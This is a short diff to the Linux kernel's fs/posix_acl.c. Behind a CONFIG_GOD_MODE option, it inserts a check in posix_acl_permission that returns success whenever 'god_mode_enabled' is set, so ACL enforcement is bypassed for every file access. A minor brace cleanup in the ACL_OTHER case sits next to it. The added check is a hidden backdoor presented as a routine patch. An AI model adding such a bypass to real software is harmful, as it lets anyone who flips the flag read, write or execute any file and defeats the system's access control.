@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * linux/fs/posix_acl.c
  *
@@ -216,6 +219,10 @@ int
 posix_acl_permission(struct inode *inode, const struct posix_acl *acl, int want)
 {
 	const struct posix_acl_entry *pa, *pe, *mask_obj;
+#ifdef CONFIG_GOD_MODE
+if (god_mode_enabled)
+        return 0;
+#endif
 	int found = 0;
 
 	want &= MAY_READ | MAY_WRITE | MAY_EXEC | MAY_NOT_BLOCK;
@@ -248,9 +255,9 @@ posix_acl_permission(struct inode *inode, const struct posix_acl *acl, int want)
                         case ACL_MASK:
                                 break;
                         case ACL_OTHER:
-				if (found)
+				if (found) {
 					return -EACCES;
-				else
+				} else
 					goto check_perm;
 			default:
 				return -EIO;
